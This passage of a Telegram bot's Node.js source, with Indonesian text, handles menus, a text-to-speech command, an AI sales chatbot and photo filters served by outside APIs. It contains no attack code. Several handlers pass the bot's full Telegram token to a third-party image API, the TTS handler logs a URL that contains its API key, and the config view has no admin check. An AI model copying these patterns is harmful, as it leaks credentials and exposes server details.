┃ ❏ ─· /unli name,id
┃ ❏ ─· /cadmin name,id
╰──────────━𖣐
</blockquote>`;
await bot.editMessageCaption(toolsList, {
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[{ text: '<<', callback_data: 'back' }]
]
}
});
} else if (data === 'owner_menu' || data === 'ownermenu') {
if (!isAdmin(userId)) {
await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Hanya admin yang bisa!', show_alert: true });
return;
}
const otakai = loadOtakai();
const aiStatus = otakai.ai_enabled ? '✅ AKTIF' : '⏸️ NONAKTIF';
const ownerList = `<blockquote>┌─⧼ <b>ᴏᴡɴᴇʀ ᴍᴇɴᴜ</b> ⧽
┃ ❏ ─· /addadmin [id]
┃ ❏ ─· /cadmin username,id
┃ ❏ ─· /delpanel [id]
┃ ❏ ─· /deladmin [id]
┃ ❏ ─· /addseller [id]
┃ ❏ ─· /delseller [id]
┃ ❏ ─· /broadcast [pesan]
╰─────────────⬣
┌─⧼ <b>🤖 AI KASIR SYSTEM</b> ⧽
┃ ❏ ─· /ai on
┃ ❏ ─· /ai off
┃ ❏ ─· /aimemory
╰─────────────⬣
┌─⧼ <b>sʏsᴛᴇᴍ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b> ⧽
┃ ❏ ─· /update
┃ ❏ ─· /backup
┃ ❏ ─· /restart
┃ ❏ ─· /logs
╰─────────────⬣</blockquote>`;
await bot.editMessageCaption(ownerList, {
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[{ text: '<<', callback_data: 'back' }]
]
}
});
} else if (data === 'view_config') {
const configData = getServerConfig();
const otakai = loadOtakai();
const aiStatus = otakai.ai_enabled ? 'AKTIF ✅' : 'NONAKTIF ⏸️';
const totalMemoryUsers = Object.keys(otakai.users || {}).length;
const configText = `<blockquote>┌─⧼ <b>ꜱᴇʀᴠᴇʀ ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ</b> ⧽
┃ CPU & Memory
┃ CPU Load: ${configData.cpuLoad}%
┃ Memory: ${configData.memory.used}MB / ${configData.memory.total}GB
┃ Memory Usage: ${configData.memory.percent}%
╰────────────⬣
┌─⧼ <b>ꜱʏꜱᴛᴇᴍ ɪɴꜰᴏ</b> ⧽
┃ Uptime: ${escapeHTML(configData.uptime)}
┃ Platform: ${escapeHTML(configData.platform)}
┃ Architecture: ${escapeHTML(configData.arch)}
┃ Node.js: ${escapeHTML(configData.nodeVersion)}
╰────────────⬣

┌─⧼ <b>ʙᴏᴛ ɪɴꜰᴏ</b> ⧽
┃ Bot Age: ${configData.botAge} days
┃ Bot Version: ${escapeHTML(config.VERSI)}
┃ Developer: ${escapeHTML(config.DEVCELOPER)}
┃ Owner ID: ${escapeHTML(config.OWNER_ID)}
╰────────────⬣
┌─⧼ <b>🤖 AI KASIR STATUS</b> ⧽
┃ Status: ${aiStatus}
┃ Memory Users: ${totalMemoryUsers}
╰────────────⬣
┌─⧼ <b>ᴜsᴇʀ sᴛᴀᴛɪsᴛɪᴄs</b> ⧽
┃ Total Users: ${configData.totalUsers || 0}
┃ Total Sellers: ${configData.totalSellers || 0}
┃ Total Admins: ${configData.totalAdmins || 0}
╰────────────⬣</blockquote>`;
await bot.editMessageCaption(configText, {
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[{ text: '↻ Refresh', callback_data: 'refresh_config' }],
[{ text: '<<', callback_data: 'back' }]
]
}
});
} else if (data === 'refresh_config') {
await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Config refreshed!', show_alert: false });
const configData = getServerConfig();
const resellerData = loadReseller();
const totalSellers = Object.keys(resellerData).length;
const adminData = loadAdmins();
const totalAdmins = Object.keys(adminData).length;
const usersData = loadUsers();
const totalUsers = Object.keys(usersData).length;
const otakai = loadOtakai();
const aiStatus = otakai.ai_enabled ? 'AKTIF ✅' : 'NONAKTIF ⏸️';
const totalMemoryUsers = Object.keys(otakai.users || {}).length;
const configText = `<blockquote>┌─⧼ <b>ꜱᴇʀᴠᴇʀ ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ</b> ⧽
┃ CPU & Memory
┃ CPU Load: ${configData.cpuLoad}%
┃ Memory: ${configData.memory.used}MB / ${configData.memory.total}GB
┃ Memory Usage: ${configData.memory.percent}%
╰────────────⬣
┌─⧼ <b>ꜱʏꜱᴛᴇᴍ ɪɴꜰᴏ</b> ⧽
┃ Uptime: ${escapeHTML(configData.uptime)}
┃ Platform: ${escapeHTML(configData.platform)}
┃ Architecture: ${escapeHTML(configData.arch)}
┃ Node.js: ${escapeHTML(configData.nodeVersion)}
╰────────────⬣

┌─⧼ <b>ʙᴏᴛ ɪɴꜰᴏ</b> ⧽
┃ Bot Age: ${configData.botAge} days
┃ Bot Version: ${escapeHTML(config.VERSI)}
┃ Developer: ${escapeHTML(config.DEVCELOPER)}
┃ Owner ID: ${escapeHTML(config.OWNER_ID)}
╰────────────⬣
┌─⧼ <b>🤖 AI KASIR STATUS</b> ⧽
┃ Status: ${aiStatus}
┃ Memory Users: ${totalMemoryUsers}
┃ API: ${escapeHTML(AI_API_URL)}
╰────────────⬣
┌─⧼ <b>ᴜsᴇʀ sᴛᴀᴛɪsᴛɪᴄs</b> ⧽
┃ Total Users: ${totalUsers}
┃ Total Sellers: ${totalSellers}
┃ Total Admins: ${totalAdmins}
╰────────────⬣</blockquote>`;
await bot.editMessageCaption(configText, {
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML',
reply_markup: {
inline_keyboard: [
[{ text: '↻ Refresh', callback_data: 'refresh_config' }],
[{ text: '<<', callback_data: 'back' }]
]
}
});
} else if (data === 'back' || data === 'back_to_menu') {
try {
const users = loadUsers();
const isUserReseller = isReseller(userId);
const isUserAdmin = isAdmin(userId);
let status = 'User';
if (isUserAdmin) {
status = 'Admin 🜲';
} else if (isUserReseller) {
status = 'Seller';
}
const uptime = os.uptime();
const vpsUptimeStr = `${Math.floor(uptime / 86400)}d ${Math.floor((uptime % 86400) / 3600)}h ${Math.floor((uptime % 3600) / 60)}m`;
const totalUsers = Object.keys(users).length;
const caption = `<blockquote>( 👤 ) - 情報, ${escapeHTML(username)}</blockquote>
안녕하세요 사용자, 환영합니다!

<blockquote><b>Status :</b> ${escapeHTML(status)}
<b>bot name :</b> ${escapeHTML(config.BOT_NAME)}
<b>versi bot :</b> ${escapeHTML(config.VERSI)}
<b>Total User :</b> ${totalUsers} User
<b>Waktu :</b> ${new Date().toLocaleTimeString('id-ID', {hour12: false})}</blockquote>

Ini adalah durasi aktif panel
<blockquote>📡 ${escapeHTML(vpsUptimeStr)}</blockquote>`;
const buttons = {
inline_keyboard: [
[
{ text: "⿻ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ", callback_data: "createpanel" },
{ text: "⿻ ᴜᴘɢʀᴀᴅᴇ sᴇʟʟᴇʀ", callback_data: "buy_seller" }
],
[
{ text: "ᴛᴏᴏʟꜱ ᴍᴇɴᴜ", callback_data: "tools_menu" },
{ text: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "ownermenu" }
],
[
{ text: "ᴠɪᴇᴡ ᴄᴏɴꜰɪɢ", callback_data: "view_config" },
{ text: "ᴄᴇᴋ ɪᴅ", callback_data: "cek_id" }
],
[
{ text: "ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url: "https://t.me/botzmarket59" }
],
[
{ text: "ᴄʜᴀᴛ ᴀᴅᴍɪɴ", url: config.URLADMIN }
]
]
};
await bot.editMessageCaption(caption, {
chat_id: chatId,
message_id: messageId,
parse_mode: 'HTML',
reply_markup: buttons
});
} catch (error) {
console.error('Error in back menu:', error);
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🔊 TTS (TEXT TO SPEECH) COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tts(?:\s+(.+))?$/i, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const text = match[1];
const messageText = `/tts ${text || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);

// Handle reply to message
let inputText = '';
if (msg.reply_to_message && msg.reply_to_message.text) {
inputText = msg.reply_to_message.text.trim();
} else if (text) {
inputText = text.trim();
}

if (!inputText) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n\n` +
`<b>Contoh:</b> <code>/tts halo apa kabar</code>\n\n` +
`<i>Atau reply pesan yang berisi teks.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}

if (inputText.length > 500) {
return bot.sendMessage(chatId,
`<blockquote>❌ Teks terlalu panjang!</blockquote>\n\n` +
`Maksimal 500 karakter.\n` +
`Panjang teks Anda: ${inputText.length} karakter\n\n` +
`<i>Persingkat teks Anda.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}

const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔊 Membuat TTS Audio...</blockquote>\n\n` +
`<b>Teks:</b> ${escapeHTML(inputText.substring(0, 100))}${inputText.length > 100 ? '...' : ''}\n` +
`<b>Suara:</b> Indonesia (default)\n` +
`<i>Mohon tunggu...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);

try {
const encodedText = encodeURIComponent(inputText);
const apiUrl = `https://exsalapi.my.id/api/audio/tiktok-tts?text=${encodedText}&voice=id_001&apikey=${AI_API_KEY}`;
console.log('Mengirim request ke API TTS:', apiUrl);
const response = await fetch(apiUrl, {
headers: {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
'Accept': 'application/json',
'Content-Type': 'application/x-www-form-urlencoded'
}
});
const responseText = await response.text();
console.log('Response raw:', responseText);
let data;
try {
data = JSON.parse(responseText);
} catch (e) {
throw new Error(`Invalid JSON response: ${responseText.substring(0, 100)}`);
}
console.log('TTS API Response:', JSON.stringify(data, null, 2));
if (!response.ok || !data || data.status === false || !data.data || !data.data.url) {
throw new Error(data.message || `HTTP ${response.status}: ${responseText.substring(0, 100)}`);
}

// Simpan audio ke buffer terlebih dahulu
const audioResponse = await fetch(data.data.url);
if (!audioResponse.ok) {
throw new Error(`Gagal mengunduh audio: ${audioResponse.status}`);
}
const audioBuffer = await audioResponse.arrayBuffer();

// Buat keyboard dengan Indonesia sebagai suara aktif (✅)
const keyboard = {
inline_keyboard: [
[
{ text: '✅ Indonesia', callback_data: `tts_id_${encodeURIComponent(inputText.substring(0, 100))}` },
{ text: '🇺🇸 US Female', callback_data: `tts_usf_${encodeURIComponent(inputText.substring(0, 100))}` }
],
[
{ text: '🇺🇸 US Male', callback_data: `tts_usm_${encodeURIComponent(inputText.substring(0, 100))}` },
{ text: '🇯🇵 Japanese', callback_data: `tts_jp_${encodeURIComponent(inputText.substring(0, 100))}` }
],
[
{ text: '🇰🇷 Korean', callback_data: `tts_kr_${encodeURIComponent(inputText.substring(0, 100))}` }
]
]
};

// Kirim audio sebagai buffer
const sentMessage = await bot.sendAudio(chatId, Buffer.from(audioBuffer), {
caption: `<blockquote>🔊 TTS Audio Selesai!</blockquote>\n\n` +
`<b>Teks:</b> ${escapeHTML(inputText.substring(0, 100))}${inputText.length > 100 ? '...' : ''}\n` +
`<b>Suara:</b> 🇮🇩 Indonesia\n` +
`<b>Panjang:</b> ${inputText.length} karakter\n\n` +
`<i>Pilih suara lain:</i>`,
parse_mode: 'HTML',
reply_markup: keyboard,
reply_to_message_id: msg.message_id
});

// Simpan informasi di cache untuk callback handler
if (!global.ttsCache) global.ttsCache = {};
const cacheKey = `tts_${sentMessage.message_id}`;
global.ttsCache[cacheKey] = {
text: inputText,
messageId: sentMessage.message_id,
chatId: chatId
};

await bot.deleteMessage(chatId, processingMsg.message_id);

} catch (error) {
console.error('TTS error:', error);
let errorMessage = '';
if (error.message.includes('400') || error.message.includes('Bad Request')) {
errorMessage = `<blockquote>❌ Teks mengandung karakter tidak valid!</blockquote>\n` +
`<i>Pastikan teks hanya mengandung karakter yang didukung.</i>`;
} else if (error.message.includes('failed to get HTTP URL content')) {
errorMessage = `<blockquote>❌ Gagal mengambil konten audio!</blockquote>\n` +
`<i>URL audio tidak valid atau tidak dapat diakses. Coba lagi dengan teks lain.</i>`;
} else if (error.message.includes('API error')) {
errorMessage = `<blockquote>❌ API TTS sedang gangguan!</blockquote>\n` +
`<i>Sistem TTS sedang tidak bisa diakses.</i>`;
} else if (error.message.includes('gagal membuat audio') || error.message.includes('Invalid JSON')) {
errorMessage = `<blockquote>❌ Gagal membuat audio!</blockquote>\n` +
`<i>API tidak bisa memproses teks yang diberikan.</i>`;
} else if (error.message.includes('Gagal mengunduh audio')) {
errorMessage = `<blockquote>❌ Gagal mengunduh file audio!</blockquote>\n` +
`<i>Server audio tidak merespon. Coba lagi nanti.</i>`;
} else {
errorMessage = `<blockquote>❌ Error membuat TTS!</blockquote>\n` +
`<code>${escapeHTML(error.message.substring(0, 100))}</code>`;
}
try {
await bot.editMessageText(
errorMessage,
{ 
chat_id: chatId, 
message_id: processingMsg.message_id, 
parse_mode: 'HTML'
}
);
} catch (editError) {
await bot.sendMessage(chatId, errorMessage, { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🤖 AI KASIR ON/OFF COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/ai(?:\s+(on|off))?$/i, async (msg, match) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const action = match[1] ? match[1].toLowerCase() : null;
const messageText = `/ai ${action || ''}`.trim();
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId, 
`<blockquote>❌ Hanya admin yang bisa mengontrol AI!</blockquote>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
if (!action) {
const currentStatus = isAIEnabled() ? 'AKTIF' : 'NONAKTIF';
return bot.sendMessage(chatId,
`<blockquote>🤖 STATUS AI KASIR</blockquote>\n\n` +
`Status saat ini: <b>${currentStatus}</b>\n\n` +
`<b>Penggunaan:</b>\n` +
`<code>/ai on</code> - Aktifkan AI Kasir\n` +
`<code>/ai off</code> - Nonaktifkan AI Kasir`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
if (action === 'on') {
toggleAI(true);
await bot.sendMessage(chatId,
`<blockquote>✅ AI KASIR DIAKTIFKAN</blockquote>\n\n` +
`Sistem AI kasir pribadi sekarang aktif!\n\n` +
`Fitur:\n` +
`• Akan merespon pesan non-command\n` +
`• Ingatan interaksi per user\n` +
`• Promosi panel untuk user baru\n` +
`• Bantuan informasi produk`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const ownerMsg = `<blockquote>🤖 AI KASIR DIAKTIFKAN</blockquote>\n\n` +
`<b>Oleh:</b> ${escapeHTML(username)}\n` +
`<b>User ID:</b> <code>${userId}</code>\n` +
`<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
`<i>AI sekarang aktif dan siap melayani!</i>`;
await bot.sendMessage(config.OWNER_ID, ownerMsg, { parse_mode: 'HTML' });
} else if (action === 'off') {
toggleAI(false);
await bot.sendMessage(chatId,
`<blockquote>⏸️ AI KASIR DINONAKTIFKAN</blockquote>\n\n` +
`Sistem AI kasir pribadi sekarang nonaktif.\n` +
`Tidak akan merespon pesan user.`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📊 AI MEMORY STATUS COMMAND
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/aimemory$/i, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/aimemory';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!isAdmin(userId)) {
return bot.sendMessage(chatId,
`<blockquote>❌ Hanya admin yang bisa!</blockquote>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
const otakai = loadOtakai();
const userCount = Object.keys(otakai.users).length;
const aiStatus = otakai.ai_enabled ? 'AKTIF' : 'NONAKTIF';
let memoryInfo = `<blockquote>🤖 AI MEMORY STATUS</blockquote>\n\n`;
memoryInfo += `<b>Status AI:</b> ${aiStatus}\n`;
memoryInfo += `<b>Total Users:</b> ${userCount}\n\n`;
const recentUsers = Object.entries(otakai.users)
.sort((a, b) => new Date(b[1].last_interaction) - new Date(a[1].last_interaction))
.slice(0, 10);
memoryInfo += `<b>📊 User Terakhir Berinteraksi:</b>\n`;
recentUsers.forEach(([id, data], index) => {
const lastSeen = new Date(data.last_interaction).toLocaleString('id-ID');
memoryInfo += `${index + 1}. ID: <code>${id}</code>\n`;
memoryInfo += `   Pesan: ${data.message_count || 0}x\n`;
memoryInfo += `   Terakhir: ${lastSeen}\n`;
});
await bot.sendMessage(chatId, memoryInfo, { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 💬 AI KASIR PRIVATE CHAT HANDLER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('message', async (msg) => {
if (!msg.text) return;
if (msg.text.startsWith('/')) return;
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
const userMessage = msg.text.trim();
if (userMessage.length < 2 || userMessage.length > 500) return;
if (msg.chat.type !== 'private') return;
if (!isAIEnabled()) return;
if (msg.from.is_bot) return;
logUserInteraction(userId, username, 'private', `AI_QUERY: ${userMessage.substring(0, 50)}`);
await bot.sendChatAction(chatId, 'typing');
try {
const aiResult = await callAIChat(userId, userMessage);
if (aiResult.success) {
await bot.sendMessage(chatId, aiResult.response, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
if (aiResult.isNewUser) {
setTimeout(async () => {
await bot.sendMessage(chatId,
`<blockquote>🛒 INGIN MEMBELI PANEL?</blockquote>\n\n` +
`Untuk membuat panel langsung, gunakan command:\n\n` +
`<code>/unli username,id_telegram</code>\n` +
`Contoh: <code>/unli johndoe,${userId}</code>\n\n` +
`Atau paket lainnya:\n` +
`<code>/1gb username,id</code>\n` +
`<code>/seller username,id</code>\n\n` +
`Pembayaran otomatis via QRIS!`,
{ parse_mode: 'HTML' }
);
}, 1000);
}
} else {
await bot.sendMessage(chatId,
`<blockquote>⚠️ Maaf, AI sedang sibuk</blockquote>\n\n` +
`Coba lagi nanti atau gunakan command langsung:\n` +
`<code>/menu</code> untuk melihat menu`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
} catch (error) {
console.error('AI handler error:', error);
await bot.sendMessage(chatId,
`<blockquote>❌ Gagal memproses pesan</blockquote>\n\n` +
`Silakan coba lagi atau hubungi admin.\n` +
`Error: <code>${escapeHTML(error.message.substring(0, 100))}</code>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📱 TOMIRROR COMMAND - AI MIRROR FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/tomirror$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/tomirror';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/tomirror</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi mirror style.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter mirror...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tomirror?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>📱 Mirror iPhone style!</blockquote>\n` +
`<i>Filter mirror berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>📱 Mirror iPhone style!</blockquote>\n` +
`<i>Filter mirror berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tomirror error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
try {
await bot.deleteMessage(chatId, processingMsg?.message_id || 0);
} catch (e) {}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 📱 HANDLER UNTUK FOTO DENGAN CAPTION /TOMIRROR
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.on('photo', async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
if (msg.caption && msg.caption.trim() === '/tomirror') {
const messageText = 'PHOTO_CAPTION: /tomirror';
logUserInteraction(userId, username, chatType, messageText, groupName);
try {
const fileId = msg.photo[msg.photo.length - 1].file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter mirror...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/tomirror?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>📱 Mirror iPhone style!</blockquote>\n` +
`<i>Filter mirror berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>📱 Mirror iPhone style!</blockquote>\n` +
`<i>Filter mirror berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Tomirror caption error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
errorMessage = `<blockquote>⚠️ API sedang maintenance</blockquote>\n` +
`<i>Tunggu beberapa saat untuk mencoba kembali.</i>`;
} else if (error.message?.includes('timeout')) {
errorMessage = `<blockquote>⏰ Timeout</blockquote>\n` +
`<i>Proses terlalu lama. Coba foto yang lebih kecil.</i>`;
} else {
errorMessage = `<blockquote>❌ Error memproses foto</blockquote>\n` +
`<code>${escapeHTML(error.message || 'Unknown error')}</code>`;
}
await bot.sendMessage(chatId, errorMessage, {
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
}
}
});

//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// 🎨 TOREAL COMMAND - AI REALISTIC FILTER
//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
bot.onText(/^\/toreal$/, async (msg) => {
const chatId = msg.chat.id;
const userId = msg.from.id.toString();
const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
const chatType = msg.chat.type;
const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
const messageText = '/toreal';
logUserInteraction(userId, username, chatType, messageText, groupName);
if (!msg.reply_to_message || !msg.reply_to_message.photo) {
return bot.sendMessage(chatId,
`<blockquote>❌ Format salah!</blockquote>\n` +
`<b>Reply foto dengan:</b> <code>/toreal</code>\n\n` +
`<i>Balas foto yang ingin diubah jadi realistic style.</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
}
try {
const photo = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1];
const fileId = photo.file_id;
const processingMsg = await bot.sendMessage(chatId,
`<blockquote>🔄 Memproses foto...</blockquote>\n` +
`<i>Mengaplikasikan filter realistic AI...</i>`,
{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
);
const file = await bot.getFile(fileId);
const filePath = file.file_path;
const imageUrl = `https://api.telegram.org/file/bot${config.TELEGRAM_TOKEN}/${filePath}`;
const encodedUrl = encodeURIComponent(imageUrl);
const apiUrl = `https://api-faa.my.id/faa/toreal?url=${encodedUrl}`;
const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
const contentType = response.headers["content-type"] || "";
if (contentType.startsWith("image/")) {
const imageBuffer = Buffer.from(response.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🎨 Realistic AI Gemini style!</blockquote>\n` +
`<i>Filter realistic AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} else {
try {
const jsonData = JSON.parse(response.data.toString());
const imageUrlFromApi = jsonData.url || jsonData.result || jsonData.image || jsonData.data || jsonData.data?.url;
if (!imageUrlFromApi) throw new Error('API tidak mengembalikan gambar');
const imgResponse = await axios.get(imageUrlFromApi, { responseType: "arraybuffer" });
const imageBuffer = Buffer.from(imgResponse.data);
await bot.sendPhoto(chatId, imageBuffer, {
caption: `<blockquote>🎨 Realistic AI Gemini style!</blockquote>\n` +
`<i>Filter realistic AI berhasil diterapkan.</i>`,
parse_mode: 'HTML',
reply_to_message_id: msg.message_id
});
await bot.deleteMessage(chatId, processingMsg.message_id);
} catch (jsonError) {
console.error('JSON parse error:', jsonError);
await bot.editMessageText(
`<blockquote>❌ Gagal memproses respons API</blockquote>\n` +
`<code>${escapeHTML(jsonError.message)}</code>`,
{ chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'HTML' }
);
}
}
} catch (error) {
console.error('Toreal error:', error);
let errorMessage = '';
if (error.response?.status === 500) {
